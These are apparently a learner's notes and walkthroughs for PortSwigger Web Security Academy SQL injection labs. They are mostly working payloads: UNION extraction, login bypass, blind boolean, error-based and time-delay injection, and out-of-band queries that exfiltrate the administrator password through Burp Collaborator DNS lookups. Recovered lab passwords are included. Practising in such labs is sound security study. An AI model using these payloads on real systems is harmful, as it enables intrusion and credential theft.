# PortSwigger Web Security Academy — SQL Injection

Cheatsheet used alongside the official PortSwigger one: [SQL Injection Cheat Sheet - Defensive Security Reference](https://devtooleasy.com/cheat-sheet/sql-injection)

## Quick Reference / Payload Notes

- Oracle: `SELECT * FROM v$version`
- `SELECT * FROM information_schema.tables`
- Finding SQL vulnerabilities easily: Burp Suite web vulnerability scanner.
- `'` — look for errors/anomalies.
- `ASCII(97)` — look for systematic differences in app responses.
- Boolean conditions: `' OR 1=1 --` / `' OR 1=2 --` — look for differences in app responses (blind SQL injection).
- In URL: `'+OR+1=1--`
- `'; waitfor delay ('0:0:20') --` — look for differences in time taken to respond (blind SQL injection).
- Payloads: `exec master..xp_dirtree '//0efdy… .burpcollaborator.net/a'` — look for network interaction (blind SQL injection).
- UNION: `' UNION SELECT username, password FROM users--`

---

## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

1. Added to URL: `https://0a4900b804ecf285ab39984d000300c8.web-security-academy.net/filter?category=Gifts%27+OR+1=1--`

## Lab: SQL injection vulnerability allowing login bypass

1. In username field: `administrator'--`

---

## Order of SQL Injection

- **1st order SQL injection** — the app processes user input from an HTTP request and incorporates it into the SQL query in an unsafe way.
- **2nd order SQL injection** — the app takes user input from an HTTP request and stores it for later use. Also called **stored SQL injection**.

## Bypassing Filters

- Encoding or escaping characters in prohibited keywords.
- Example (XML-based injection):
```xml
  <stockCheck>
  <productId>123</productId>
  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
  </stockCheck>
```

---

## Lab: SQL injection with filter bypass via XML encoding

1. Encoded U, S, and `'`.
2. Prodded around with no success. Took a hint — Hackvector.
3. Accessed the `POST /product/stock` request in the proxy browser (Burp Suite), then sent it to Repeater. Saw that `storeId` could be tampered with and returned useful output in the response.
4. Input a UNION SELECT statement, but the attack was detected — meaning it needed to be encoded.
5. Selected the code and encoded it using hex entities via Hackvector. Inserted the proper statement to pull the username and password from the `users` table, using string concatenation (without it, the query doesn't work). Retrieved the credentials.
6. `UNION SELECT username || '~' || password FROM users`

---

## Preventing SQL Injection

- Use prepared statements. Example of a good query:
```java
  PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
  statement.setString(1, input);
  ResultSet resultSet = statement.executeQuery();
```
- Additional protection: whitelist permitted input values, or use different logic to deliver the required behavior.

## Querying Database Type and Version

- Microsoft, MySQL: `SELECT @@version`
- Oracle: `SELECT * FROM v$version`
- PostgreSQL: `SELECT version()`
- Example: `' UNION SELECT @@version--`

---

## Lab: SQL injection attack, querying the database type and version on Oracle

1. Chose a filter, sent it to Repeater, and inspected it — the only injectable spot was the `category` request parameter.
2. Usual Oracle usage is `SELECT * FROM v$version`. Used UNION and put this in the request — not solved.
3. Replaced spaces with `+` and used URL encoding for special characters — still not solved.
4. Took a hint to use `dual`. Searched for a SQL injection cheatsheet to learn how to use it. Resource: SQL Injection Cheat Sheet - Defensive Security Reference.
5. Tried `' UNION SELECT NULL,NULL FROM dual--` → then with `+` and encoded characters — still not solved.
6. Tried `' UNION SELECT banner,NULL FROM v$version--`
7. Final working payload: `GET /filter?category=Gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/2`

## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

1. Chose a filter, sent it to Repeater, and inspected it — the only injectable spot was the `category` request parameter.
2. Used Microsoft/MySQL: `SELECT @@version` → `'+UNION+SELECT+@@version--`
3. Checked the earlier resource (SQL Injection Cheat Sheet - Defensive Security Reference), which has entries for both Microsoft and MySQL.
4. Tried Microsoft-style: `' UNION SELECT 1,@@version--` — not solved (included `'+'`).
5. Tried Microsoft-style, thinking any error might reveal more info: `' UNION SELECT name,NULL FROM sys.databases--`
6. Then tried MySQL-style: `' UNION SELECT NULL,@@version,NULL--`
7. Final working payload: `GET /filter?category=Lifestyle'+UNION+SELECT+@@version,+NULL-- HTTP/2`

---

## Listing Database Contents

- List tables in a database (non-Oracle): `SELECT * FROM information_schema.tables`
- Query columns in individual tables: `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

---

## Lab: SQL injection attack, listing the database contents on non-Oracle databases

1. `GET /filter?category=Lifestyle'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables-- HTTP/2`

   <img height="200" alt="image" src="https://github.com/user-attachments/assets/2c567479-0bf8-4ecc-9615-9c4b06b2ae30" />

   <img height="200" alt="image" src="https://github.com/user-attachments/assets/3b539a2e-663b-48dd-9dff-bbc3955fefb8" />

   <img height="300" alt="image" src="https://github.com/user-attachments/assets/8b74ee5e-7a95-4b56-98df-b116b2510dc5" />


2. `Gifts'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_fxhtha'-- HTTP/2` → found columns `username_fwieps`; `password_urrsec`
3. `GET /filter?category=Gifts'+UNION+SELECT+username_fwieps,+password_urrsec+FROM+users_fxhtha-- HTTP/2`

   Result: `<th>administrator</th> <td>fmap34rrjrs132souh7a</td>`

---

## Oracle-Specific Enumeration

- List tables: `SELECT * FROM all_tables`
- List columns: `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

---

## Lab: SQL injection attack, listing the database contents on Oracle

1. `GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/2` → found table `USERS_HVSZPZ`

   <img height="200" alt="image" src="https://github.com/user-attachments/assets/94e8cb60-5c74-4732-bcd0-05b9319af988" />

2. `GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+column_name,data_type+FROM+all_tab_columns+WHERE+table_name='USERS_HVSZPZ'-- HTTP/2` → found columns `USERNAME_ANCARX`, `PASSWORD_MHIKHV`
3. `GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+USERNAME_ANCARX,+PASSWORD_MHIKHV+FROM+USERS_HVSZPZ-- HTTP/2`

   Result: `<th>administrator</th> <td>6v0g54krjksb8ymc5b83</td>`

---

## UNION Attacks

- Double query using UNION: `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
- **Requirements for a UNION query to work:**
  1. Individual queries must return the same number of columns.
  2. Data types in each column must be compatible between the individual queries.

### Determining Number of Columns Required

1. **ORDER BY** clauses, incrementing the specified column index until an error occurs:
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
   Error returned: `The ORDER BY position number 3 is out of range of the number of items in the select list.`

2. **UNION SELECT** payloads specifying a different number of null values:
   ' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--
   ' UNION SELECT NULL,NULL,NULL--
   Error returned: `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

---

## Lab: SQL injection UNION attack, determining the number of columns returned by the query

1. Added `NULL` values in `'+UNION+SELECT+NULL--` until the error disappeared, then added one more to trigger the error again — meaning 3 columns exist.
2. `GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL,NULL,NULL,NULL-- HTTP/2`

---

## Additional UNION Notes

- **Oracle-specific:** must use the `FROM` keyword — `' UNION SELECT NULL FROM DUAL--`
- **On MySQL:** `--` must be followed by a space. Alternative: `#`
- After determining the number of columns, test whether each can hold string data.
- Example: if a query returns 4 columns:
  ' UNION SELECT 'a',NULL,NULL,NULL--
  ' UNION SELECT NULL,'a',NULL,NULL--
  ' UNION SELECT NULL,NULL,'a',NULL--
  ' UNION SELECT NULL,NULL,NULL,'a'--
  If not compatible: `Conversion failed when converting the varchar value 'a' to data type int.`

---

## Lab: SQL injection UNION attack, finding a column containing text

1. `GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL,NULL,NULL,NULL-- HTTP/2`
2. `GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+'RdLYJP',NULL,NULL-- HTTP/2`

---

## Getting Interesting Data

- Example: retrieve contents of the `users` table by submitting: `' UNION SELECT username, password FROM users--`
- To perform this attack, you need to know there's a table called `users` with columns `username` and `password`.

---

## Lab: SQL injection UNION attack, retrieving data from other tables

1. `GET /filter?category=Accessories'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables-- HTTP/2` (find `users` table)
2. `GET /filter?category=Accessories'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'-- HTTP/2` (find column names `username`, `password`, `email`)
3. `GET /filter?category=Accessories'+UNION+SELECT+username,password+FROM+users-- HTTP/2` — found credentials: `<th>administrator</th> <td>a9lpo2zf4ej4bhenkg5b</td>`

---

## Retrieving Multiple Values with a Single Column

- Example, on Oracle: `' UNION SELECT username || '~' || password FROM users--`

---

## Lab: SQL injection UNION attack, retrieving multiple values in a single column

1. `GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL-- HTTP/2`
2. `GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL,NULL-- HTTP/2`
3. `GET /filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL,NULL,NULL-- HTTP/2` (2 columns)
4. `GET /filter?category=Accessories'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- HTTP/2`
5. `GET /filter?category=Accessories'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users'-- HTTP/2`
6. `GET /filter?category=Accessories'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- HTTP/2` → `administrator~9cvzc68jh0w4zsz0wq14`

---

## Blind SQL Injection

UNION attacks aren't effective against blind SQL injection vulnerabilities.

### Exploiting Blind SQL Injection by Triggering Conditional Responses

- Cookie: `TrackingId=u5YD3PapBcR4lN3e7Tj4`
- App uses: `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
- **Exploit working:**
  - `…xyz' AND '1'='1` → returns a result because `AND` is true.
  - `…xyz' AND '1'='2` → does not return a result because the condition is false.
- Example: table called `users` with columns `username` and `password`. A user is `administrator`. Determining the password character by character:
  - `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm` → returns the "Welcome back" message, indicating the injected condition is true, so the first character of the password is greater than `m`.
  - `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't` → does not return the message, indicating the condition is false, so the first character is not greater than `t`.
  - `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's` → returns the message, confirming the first character of the password is `s`.

---

## Lab: Blind SQL injection with conditional responses

1. `Cookie: TrackingId=OAYVVeIraJwpFXsa' AND '1'='1;` (returns "Welcome Back" message)
2. `Cookie: TrackingId=OAYVVeIraJwpFXsa' AND '1'='2;` (does not return the message)
3. `Cookie: TrackingId=pJsJfzLRzhfqhAOK' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'m;` (no message — means the password starts with a letter before `m`. `<m` gives the message, `=m` gives no message.)
4. `Cookie: TrackingId=pJsJfzLRzhfqhAOK' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'f;` (no message — starts with a letter less than `f`. `<f` gives the message, `=f` gives no message.)
5. `Cookie: TrackingId=pJsJfzLRzhfqhAOK' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a;` (no message — doesn't start with `a`)
6. Tried `b` (no), `c` (no) — no letters worked, so tried numbers. Starts with `4`. Password = `4…` (`<a` implied numbers).
7. `Cookie: TrackingId=pJsJfzLRzhfqhAOK' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),2,1)>'m;` (message shown, means `>m`)
8. `Cookie: TrackingId=pJsJfzLRzhfqhAOK' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),2,1)>'s;` (message shown)
9. `Cookie: TrackingId=pJsJfzLRzhfqhAOK' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),2,1)='y;` (message shown)
10. Password = `4yn…`; checked password length: `Cookie: TrackingId=pJsJfzLRzhfqhAOK' AND SUBSTRING((SELECT password FROM users WHERE username='administrator' AND LENGTH(password)=20),16,1)='7;`
11. Kept iterating. Final password: `4yn3xqoe6lzoz5n7n9aj`

---

### Error-Based SQL Injection

- **Exploiting blind SQL injection by triggering conditional errors** — modify the query so it causes a database error only if the condition is true.
- Example, 2 requests sent containing `TrackingId` cookie values in turn:
  - `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a` (CASE expression evaluates to `'a'`, no error)
  - `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a` (evaluates to `1/0`, causes a divide-by-zero error)
- Inputs use the `CASE` keyword to test a condition and return a different expression. The difference in the app's HTTP response is used to detect whether the injection is true.
- Retrieve data by testing one character at a time: `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

---

## Lab: Blind SQL injection with conditional errors

1. `Cookie: TrackingId=L6gVY7F6P4rvqnMp' AND (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)>'m') THEN 1/0 ELSE 'a' END FROM users)='a;` (tried different values to see if the error changed, but it always showed "Internal server error." Took a hint.)
2. `Cookie: TrackingId=A5kg1bCe3onraU2g';` (error) → `Cookie: TrackingId=A5kg1bCe3onraU2g'';` (no error)
3. `Cookie: TrackingId=A5kg1bCe3onraU2g'|| (SELECT NULL FROM dual) ||';`
4. `Cookie: TrackingId=A5kg1bCe3onraU2g'|| (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||';`
5. `Cookie: TrackingId=A5kg1bCe3onraU2g'|| (SELECT CASE WHEN(1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||';`
6. `Cookie: TrackingId=A5kg1bCe3onraU2g'|| (SELECT CASE WHEN(1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') ||';`
7. `Cookie: TrackingId=M3B0LrC7wk5EjeZd'|| (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') ||';` (500)
8. `Cookie: TrackingId=M3B0LrC7wk5EjeZd'|| (SELECT CASE WHEN LENGTH(password)=1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') ||';` (200)
9. `Cookie: TrackingId=M3B0LrC7wk5EjeZd'|| (SELECT CASE WHEN password>'m' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') ||';` (500)
10. This approach didn't work, so switched to a MySQL-style test:

11. `Cookie: TrackingId=M3B0LrC7wk5EjeZd' AND 1=1--';` (MySQL; 200 code)
12. `Cookie: TrackingId=M3B0LrC7wk5EjeZd' AND 1=2--';` (MySQL; still 200 code)
13. `Cookie: TrackingId=M3B0LrC7wk5EjeZd' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a'--;`
14. `Cookie: TrackingId=M3B0LrC7wk5EjeZd' AND (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--;` (error means true — password is longer than 1 character)
15. `Cookie: TrackingId=M3B0LrC7wk5EjeZd' AND (SELECT CASE WHEN LENGTH(password)>100 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--;` (no error means false — password not greater than 100)
16. `Cookie: TrackingId=M3B0LrC7wk5EjeZd' AND (SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--;` (`>21` gives no error, meaning not greater than 21; `=20` gives an error, meaning the password is 20 characters)
17. `Cookie: TrackingId=M3B0LrC7wk5EjeZd' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--;` (if the first character is `a`, get an error; if not, no error — got 200, meaning `a` is not the first character)
18. Sent the request to Intruder. Set the payload config to Brute Forcer, `a-z`, `0-9`, min/max payload length 1. Started the attack — got an error for `m`, meaning the first character is `m`. Password = `m…`
19. To iterate and get all characters, set 2 payloads: `password position` and `$1$,1)='$a$'`. One payload ranged 0–20 (since the password is 20 characters), and the other ran `a-z0-9` as before. Ran for a few hours and produced the full password.
20. Ran each position by changing the `SUBSTR` value.
21. Final password: `m2kjyf0uhbs2k243yp4f`

---

### Exposing Sensitive Data via Verbose SQL Error Messages

- A single quote in the `id` parameter triggers: `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`
- Goal: induce the app to generate an error message that contains some of the data returned by the query.
- `CAST()` — converts one data type to another: `CAST((SELECT example_column FROM example_table) AS int)`
- Since data is often a string, converting to `int` will trigger an error such as: `ERROR: invalid input syntax for type integer: "Example data"`

---

## Lab: Visible error-based SQL injection

1. `Cookie: TrackingId=Nh7Z8yIBJUKUQ5P6' AND (SELECT NULL FROM dual) --';` (Error: `relation "dual" does not exist, Position: 76` — suggests this isn't Oracle)
2. `Cookie: TrackingId=Nh7Z8yIBJUKUQ5P6' AND CAST((SELECT 1) AS INT) --';` (Error: `argument of AND must be type boolean, not type integer; Position: 63`)
3. `Cookie: TrackingId=Nh7Z8yIBJUKUQ5P6' AND 1=CAST((SELECT 1) AS INT) --';` (200)
4. `Cookie: TrackingId=Nh7Z8yIBJUKUQ5P6' AND 1=CAST((SELECT username FROM users) AS INT) --';` (Error: `Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'Nh7Z8yIBJUKUQ5P6' AND 1=CAST((SELECT username FROM users) AS'. Expected char`)
5. Removed the `TrackingId` value (`Nh7Z8yIBJUKUQ5P6`) to create more space: `Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS INT) --';` (Error: `more than one row returned by a subquery used as an expression`)
6. `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` (Error: `invalid input syntax for type integer: "administrator"` — meaning administrator is the first user in the table)
7. `Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) --';` (Error: `invalid input syntax for type integer: "8s9bau7kn1jabx1ap6y5"`)

---

### Exploiting Blind SQL Injection by Triggering Time Delays

- Create time delays depending on whether the injected condition is true or false.
- Techniques for triggering delays are specific to the type of database. On Microsoft SQL Server:
  - `'; IF (1=2) WAITFOR DELAY '0:0:10'--` (no delay, since condition is false)
  - `'; IF (1=1) WAITFOR DELAY '0:0:10'--` (10-second delay, since condition is true)
  - `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

---

## Lab: Blind SQL injection with time delays

1. Tried MySQL, then Microsoft SQL commands — didn't work.
2. PostgreSQL worked.
3. `Cookie: TrackingId=AHuAiFfah3ZCt7dI' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)::text='0' --;`

## Lab: Blind SQL injection with time delays and information retrieval

1. `Cookie: TrackingId=rsVJnP3U3EEinIrJ'%3B+SELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--;` (immediate response)
2. `Cookie: TrackingId=rsVJnP3U3EEinIrJ'%3B+SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--;` (10-second delay)
3. `Cookie: TrackingId=rsVJnP3U3EEinIrJ'%3B+SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>50)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--;` (immediate response)
4. `Cookie: TrackingId=rsVJnP3U3EEinIrJ'%3B+SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--;` (delay — password more than 19 characters)
5. `Cookie: TrackingId=rsVJnP3U3EEinIrJ'%3B+SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>21)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--;` (immediate response, so password is 20 characters)
6. `Cookie: TrackingId=rsVJnP3U3EEinIrJ'%3B+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--;`
7. Sent to Intruder and brute-forced (`a-z`, `0-9`) — the correct character produced a higher response time.
8. Final password: `y50qar85zm8mggahx5ps`

---

### Exploiting Blind SQL Injection Using Out-of-Band (OAST) Techniques

- The most effective network protocol for this: DNS.
- Tool: Burp Collaborator — detects when network interactions occur.
- Techniques for triggering a DNS query are specific to the database being used. Example, on Microsoft SQL Server, causing a DNS lookup on a specified domain:
  '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
  This causes the database to perform a lookup for the domain: `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`
- Use Burp Collaborator to generate a unique subdomain, then poll the Collaborator server to confirm when any DNS lookups occur.

---

## Lab: Blind SQL injection with out-of-band interaction

1. `Cookie: TrackingId=T7qffTAlYvg1R3sz'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//edvqvyzr0xru3p7vbwd4ybuullrcf23r.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;`
2. Right-clicked and inserted the collaborator payload in the proper place.

---

### Using an Out-of-Band Channel to Exfiltrate Data

- Example:
  '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
  This input reads the password for the `Administrator` user, appends it to a unique Collaborator subdomain, and triggers a DNS lookup.
- Lookup example: `S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`
- OAST techniques are often preferable even when other techniques also work.

---

## Lab: Blind SQL injection with out-of-band data exfiltration

1. `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
2. Right-clicked and selected "Insert collaborator payload."
3. Sent the request, then clicked "Poll now" in the Collaborator tab.
4. DNS and HTTP interactions appeared — the password for the administrator user appeared in the subdomain of the interaction.


-- End --
